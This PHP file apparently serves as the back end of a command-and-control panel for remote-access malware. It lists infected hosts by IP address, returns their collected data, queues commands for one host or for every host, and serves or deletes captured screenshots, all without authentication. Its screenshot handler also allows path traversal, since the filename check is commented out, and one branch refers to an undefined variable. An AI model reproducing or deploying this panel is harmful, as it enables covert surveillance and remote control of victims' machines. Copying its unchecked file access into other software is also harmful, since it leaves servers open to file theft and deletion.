<?php

//error_reporting(E_ALL);

$dir_data = '../data';
$dir_cmds = '../commands';
$dir_screenshots = '../screenshots';

function pv($var) {
	if (!isset($_POST[$var])) die();
	return $_POST[$var];
}
function check_user($dir, $ip) {
	if (ip2long($ip) === false || !file_exists($dir.'/'.$ip))
		die();
}
function check_screenshot($dir, $file) {
	//if (!preg_match($file, '/[0-9\\.\\-]+/')) die();
	$path = $dir.'/'.$file;
	if (!file_exists($path)) die();
}
function get_users($dir) {
	$files = scandir($dir);
	$files = array_filter($files, function($f) {
		return $f[0] != '.';
	});
	$users = array();
	foreach ($files as $file) {
		$time = filemtime($dir.'/'.$file);
		$users[] = array($file, date("F d Y H:i:s", $time));
	}
	return $users;
}
function get_screenshots($dir) {
	$files = scandir($dir);
	$files = array_filter($files, function($f) {
		return $f[0] != '.';
	});
	return array_values($files);
}
function put_cmd($file, $cmd) {
	file_put_contents($file, file_get_contents($file) . $cmd . ';');
}

if (isset($_GET['s'])) {
	$file = $_GET['s'];
	check_screenshot($dir_screenshots, $file);
	
	$path = $dir_screenshots.'/'.$file;
	
	$lastModified=filemtime($path);
	$etagFile = md5_file($path);
	$ifModifiedSince = (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) ? $_SERVER['HTTP_IF_MODIFIED_SINCE'] : false);
	$etagHeader=(isset($_SERVER['HTTP_IF_NONE_MATCH']) ? trim($_SERVER['HTTP_IF_NONE_MATCH']) : false);

	header('Last-Modified: '.gmdate('D, d M Y H:i:s', $lastModified).' GMT');
	header('Etag: '.$etagFile);
	header('Cache-Control: public');

	if (@strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE'])==$lastModified || $etagHeader == $etagFile)
	{
	       header("HTTP/1.1 304 Not Modified");
	       die();
	}
	
	header('Content-Type: image/png');
	readfile($path);
	die();
}

$req = pv('req');

if ($req === 'get_users') {
	$users = get_users($dir_data);
	echo json_encode($users);
}
else if ($req === 'get_data') {
	$user = pv('user');
	check_user($dir_data, $user);
	
	echo file_get_contents($dir_data.'/'.$user);
}
else if ($req === 'clear_data') {
	$user = pv('user');
	check_user($dir_data, $user);
	
	file_put_contents($dir_data.'/'.$user, '');
}
else if ($req === 'del_data') {
	$user = pv('user');
	check_user($dir_data, $user);
	
	unlink($dir_data.'/'.$user);
	unlink($cmd_data.'/'.$user);
}
else if ($req === 'put_cmd') {
	$user = pv('user');
	$cmd  = pv('cmd');
	check_user($dir_data, $user);
	
	put_cmd($dir_cmds.'/'.$user, $cmd);
}
else if ($req === 'get_cmd') {
	$user = pv('user');
	check_user($dir_cmds, $user);
	
	echo file_get_contents($dir_cmds.'/'.$user);
}
else if ($req === 'clear_cmd') {
	$user = pv('user');
	check_user($dir_cmds, $user);
	
	file_put_contents($dir_cmds.'/'.$user, '');
}
else if ($req === 'put_cmd_all') {
	$cmd  = pv('cmd');
	
	$users = get_users($dir_data);
	foreach($users as $user) {
		put_cmd($dir_cmds.'/'.$user[0], $cmd);
	}
}
else if ($req === 'list_screenshots') {
	$screenshots = get_screenshots($dir_screenshots);
	echo json_encode($screenshots);
}
else if ($req === 'del_screenshot') {
	$file = pv('file');
	check_screenshot($dir_screenshots, $file);
	
	$path = $dir_screenshots.'/'.$file;
	unlink($path);
}
?>